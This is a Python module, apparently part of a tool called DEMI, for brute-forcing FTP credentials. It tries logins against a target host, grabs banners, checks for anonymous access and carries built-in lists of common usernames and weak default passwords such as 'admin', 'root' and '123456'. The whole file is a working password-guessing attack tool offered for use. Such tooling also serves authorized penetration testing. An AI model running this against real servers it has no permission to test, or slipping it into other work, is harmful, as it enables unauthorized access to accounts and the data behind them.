#!/usr/bin/env python3
"""
DEMI FTP Module - FTP credential brute force module
"""

from ftplib import FTP, error_perm, error_temp
import socket

class FTPModule:
    """FTP credential testing module"""
    
    def __init__(self, port=21, timeout=5, **kwargs):
        """
        Initialize FTP module
        
        :param port: FTP port (default: 21)
        :param timeout: Connection timeout in seconds
        """
        self.port = port
        self.timeout = timeout

    def login(self, target, username, password):
        """
        Attempt FTP login with given credentials
        
        :param target: target hostname or IP
        :param username: username to test
        :param password: password to test
        :return: True if login successful, False otherwise
        """
        ftp = None
        try:
            ftp = FTP()
            ftp.connect(target, self.port, timeout=self.timeout)
            
            # Attempt login
            ftp.login(username, password)
            
            # If we get here, login was successful
            return True
            
        except error_perm as e:
            # Permanent error - usually authentication failure
            error_msg = str(e).lower()
            if any(phrase in error_msg for phrase in ['530', 'login', 'password', 'authentication', 'access denied']):
                return False
            # Other permanent errors might indicate other issues
            return False
            
        except error_temp as e:
            # Temporary error - server issues, too many connections, etc.
            return False
            
        except socket.timeout:
            # Connection timeout
            return False
            
        except socket.error as e:
            # Network errors (connection refused, host unreachable, etc.)
            return False
            
        except Exception as e:
            # Catch-all for other errors
            return False
            
        finally:
            # Always close the connection
            if ftp:
                try:
                    ftp.quit()
                except:
                    # If quit fails, try close
                    try:
                        ftp.close()
                    except:
                        pass

    def test_connectivity(self, target):
        """
        Test if target is reachable on the FTP port
        
        :param target: target hostname or IP
        :return: True if port is open, False otherwise
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((target, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def get_banner(self, target):
        """
        Get FTP banner from target
        
        :param target: target hostname or IP
        :return: FTP banner string or None
        """
        ftp = None
        try:
            ftp = FTP()
            ftp.connect(target, self.port, timeout=self.timeout)
            banner = ftp.getwelcome()
            return banner
        except Exception:
            return None
        finally:
            if ftp:
                try:
                    ftp.quit()
                except:
                    try:
                        ftp.close()
                    except:
                        pass

    def supports_anonymous(self, target):
        """
        Check if target supports anonymous FTP access
        
        :param target: target hostname or IP
        :return: True if anonymous access is allowed, False otherwise
        """
        return self.login(target, "anonymous", "anonymous@example.com")

# Common FTP usernames and passwords for testing
COMMON_FTP_USERS = [
    "admin", "administrator", "ftp", "ftpuser", "user", "test", 
    "guest", "anonymous", "root", "service", "www", "web"
]

COMMON_FTP_PASSWORDS = [
    "", "admin", "administrator", "password", "123456", "ftp", 
    "ftpuser", "user", "test", "guest", "anonymous", "root", 
    "service", "www", "web", "default", "changeme", "letmein"
]

if __name__ == "__main__":
    # Simple test
    import sys
    if len(sys.argv) < 2:
        print("Usage: python ftp.py <target> [username] [password]")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else "anonymous"
    password = sys.argv[3] if len(sys.argv) > 3 else "anonymous@example.com"
    
    module = FTPModule()
    print(f"Testing FTP connection to {target}:{module.port}")
    
    if module.test_connectivity(target):
        print("[+] Target is reachable")
        banner = module.get_banner(target)
        if banner:
            print(f"[*] FTP Banner: {banner}")
    else:
        print("[-] Target is not reachable")
        sys.exit(1)
    
    print(f"Testing login: {username}:{password}")
    result = module.login(target, username, password)
    if result:
        print("[+] Login successful!")
    else:
        print("[-] Login failed")
        
        # Test anonymous access if specific credentials failed
        if username != "anonymous":
            print("[*] Testing anonymous access...")
            if module.supports_anonymous(target):
                print("[+] Anonymous FTP access is enabled!")
            else:
                print("[-] Anonymous FTP access is disabled")
